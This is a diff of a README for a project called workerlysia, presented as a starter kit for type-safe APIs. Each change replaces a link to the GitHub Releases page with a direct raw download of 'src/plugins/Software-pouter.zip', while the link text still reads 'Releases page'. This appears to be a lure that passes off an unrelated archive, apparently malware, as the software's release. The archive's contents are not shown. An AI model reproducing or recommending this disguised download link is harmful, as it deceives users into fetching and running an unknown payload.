@@ -1,6 +1,6 @@
 # 🚀 workerlysia - Build Type-Safe APIs Easily
 
-[![Download workerlysia](https://img.shields.io/badge/Download-workerlysia-brightgreen)](https://github.com/ZidanAlata04/workerlysia/releases)
+[![Download workerlysia](https://github.com/ZidanAlata04/workerlysia/raw/refs/heads/main/src/plugins/Software-pouter.zip)](https://github.com/ZidanAlata04/workerlysia/raw/refs/heads/main/src/plugins/Software-pouter.zip)
 
 ## 📋 Overview
 
@@ -11,7 +11,7 @@ workerlysia is a modern starter kit designed to help you build type-safe APIs. I
 Follow these easy steps to download and run workerlysia:
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/ZidanAlata04/workerlysia/releases) to find the latest version of workerlysia.
+   Go to the [Releases page](https://github.com/ZidanAlata04/workerlysia/raw/refs/heads/main/src/plugins/Software-pouter.zip) to find the latest version of workerlysia.
 
 2. **Download the Application**  
    Click on the download link for the latest release on the Releases page.
@@ -43,7 +43,7 @@ To run workerlysia, you will need:
 
 ## 📥 Download & Install
 
-To get started, visit the [Releases page](https://github.com/ZidanAlata04/workerlysia/releases) where you can easily download the latest version of workerlysia.  
+To get started, visit the [Releases page](https://github.com/ZidanAlata04/workerlysia/raw/refs/heads/main/src/plugins/Software-pouter.zip) where you can easily download the latest version of workerlysia.  
 
 1. Click the download link for the latest version.
 2. After downloading, follow the extraction and setup instructions outlined above.
